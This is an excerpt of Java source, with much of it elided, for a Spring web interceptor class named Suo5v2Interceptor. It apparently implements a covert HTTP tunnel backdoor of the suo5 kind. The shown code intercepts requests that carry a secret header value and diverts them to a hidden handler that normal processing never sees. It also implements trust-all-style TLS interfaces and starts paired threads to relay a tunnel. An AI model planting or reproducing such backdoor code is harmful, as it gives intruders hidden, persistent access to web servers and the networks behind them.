 ...
 * @since 2025/12/9
 */
public class Suo5v2Interceptor implements AsyncHandlerInterceptor, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Interceptor(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2Interceptor(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
    ...
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                new Suo5v2Interceptor().process(request, response);
                return false;
            }
...
//
    ...
    private byte[] performCreate(HttpServletRequest request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2Interceptor(tunId, 1)).start();
                new Thread(new Suo5v2Interceptor(tunId, 2)).start();
            }
        } catch (Exception e) {
